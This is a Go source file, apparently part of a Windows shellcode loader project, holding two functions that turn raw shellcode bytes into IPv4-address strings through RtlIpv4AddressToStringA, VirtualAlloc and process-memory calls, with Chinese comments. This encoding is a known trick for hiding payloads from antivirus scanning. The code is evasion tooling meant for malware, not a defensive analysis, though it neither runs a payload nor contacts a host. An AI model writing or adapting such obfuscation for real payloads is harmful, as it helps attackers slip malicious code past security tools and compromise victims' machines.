package crypto

import (
	"fmt"
	"unsafe"
	"variant/xwindows"

	"golang.org/x/sys/windows"
)

func ByteToIpv4Strings(shellcode []byte) ([]string, error) {
	ipv4Addr, vaErr := xwindows.VirtualAlloc(
		0,
		uintptr(len(shellcode)/4*17),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if vaErr != nil {
		return nil, fmt.Errorf("VirtualAlloc failed: %w", vaErr)
	}

	for i := 0; i < len(shellcode)/4; i++ {
		var addr [17]byte
		ret, ipv4Err := xwindows.RtlIpv4AddressToStringA(
			uintptr(unsafe.Pointer(&shellcode[i*4])),
			uintptr(unsafe.Pointer(&addr[0])),
		)
		if ret == 0 {
			return nil, fmt.Errorf("RtlIpv4AddressToStringA failed: %w", ipv4Err)
		}

		wpErr := xwindows.WriteProcessMemory(
			windows.CurrentProcess(),
			ipv4Addr+uintptr(i*17),
			&addr[0],
			17,
			nil,
		)
		if wpErr != nil {
			return nil, fmt.Errorf("WriteProcessMemory failed: %w", wpErr)
		}
	}

	var ipv4Strings []string
	for i := 0; i < len(shellcode)/4; i++ {
		var addr [17]byte
		rpmErr := windows.ReadProcessMemory(
			windows.CurrentProcess(),
			ipv4Addr+uintptr(i*17),
			&addr[0],
			17,
			nil,
		)
		if rpmErr != nil {
			return nil, fmt.Errorf("ReadProcessMemory failed: %w", rpmErr)
		}

		ipv4Strings = append(ipv4Strings, string(addr[:]))
	}

	return ipv4Strings, nil
}

// ConversionError 自定义错误类型（可选）
type ConversionError struct {
	Stage string
	Err   error
}

func (e *ConversionError) Error() string {
	return fmt.Sprintf("[%s] %v", e.Stage, e.Err)
}

func ByteToIpv4StringsX(shellcode []byte) ([]string, error) {
	// 1. 填充输入到 4 的倍数
	if len(shellcode)%4 != 0 {
		padding := 4 - (len(shellcode) % 4)
		shellcode = append(shellcode, make([]byte, padding)...)
	}

	// 2. 计算所需内存（每组 4 字节 -> 最多 15 字符 + null 终止符）
	bufSize := (len(shellcode) / 4) * 16 // 保守分配 16 字节/项
	ipv4Addr, err := xwindows.VirtualAlloc(
		0,
		uintptr(bufSize),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE,
	)
	if err != nil {
		return nil, &ConversionError{"VirtualAlloc", err}
	}
	defer windows.VirtualFree(ipv4Addr, 0, windows.MEM_RELEASE) // 确保释放内存

	// 3. 直接操作内存指针（避免 WriteProcessMemory/ReadProcessMemory）
	ipv4Buffer := (*[1 << 30]byte)(unsafe.Pointer(ipv4Addr))[:bufSize:bufSize]

	// 4. 转换每个 4 字节组
	for i := 0; i < len(shellcode); i += 4 {
		var (
			ipBytes [4]byte
			ipBuf   [16]byte // 实际最大需要 15 字节
		)

		// 4.1 复制字节到固定数组（确保内存对齐）
		copy(ipBytes[:], shellcode[i:i+4])

		// 4.2 调用 Windows API
		ret, _ := xwindows.RtlIpv4AddressToStringA(
			uintptr(unsafe.Pointer(&ipBytes)),
			uintptr(unsafe.Pointer(&ipBuf[0])),
		)
		if ret == 0 {
			return nil, &ConversionError{"RtlIpv4AddressToStringA", windows.GetLastError()}
		}

		// 4.3 直接写入内存缓冲区
		copy(ipv4Buffer[(i/4)*16:], ipBuf[:])
	}

	// 5. 转换为 Go 字符串
	result := make([]string, 0, len(shellcode)/4)
	for offset := 0; offset < bufSize; offset += 16 {
		// 5.1 找到 null 终止符
		end := offset
		for ; end < offset+16; end++ {
			if ipv4Buffer[end] == 0 {
				break
			}
		}

		// 5.2 截取有效部分
		if end > offset {
			result = append(result, string(ipv4Buffer[offset:end]))
		}
	}

	return result, nil
}
